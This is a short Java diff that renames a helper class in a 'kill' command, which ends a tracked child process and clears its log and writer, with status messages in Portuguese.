@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.process;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.ProcessComponents;
+import br.com.introcdc.connect.client.components.ClientProcessComponents;
 
 public class ClientCommandKill extends ClientCommand {
 
@@ -20,14 +20,14 @@ public class ClientCommandKill extends ClientCommand {
         }
         try {
             Integer id = Integer.valueOf(input);
-            if (!ProcessComponents.PROCESS_LIST.containsKey(id)) {
+            if (!ClientProcessComponents.PROCESS_LIST.containsKey(id)) {
                 msg("Processo não encontrado!");
                 return;
             }
-            msg("Processo #" + id + " (" + ProcessComponents.PROCESS_LIST.remove(id) + ") finalizado!");
-            ProcessComponents.PROCESS_MAP.remove(id).destroy();
-            ProcessComponents.LOG_PROCESS.remove(id);
-            ProcessComponents.WRITER_MAP.remove(id).close();
+            msg("Processo #" + id + " (" + ClientProcessComponents.PROCESS_LIST.remove(id) + ") finalizado!");
+            ClientProcessComponents.PROCESS_MAP.remove(id).destroy();
+            ClientProcessComponents.LOG_PROCESS.remove(id);
+            ClientProcessComponents.WRITER_MAP.remove(id).close();
         } catch (Exception ignored) {
             msg("Digite um número válido!");
         }
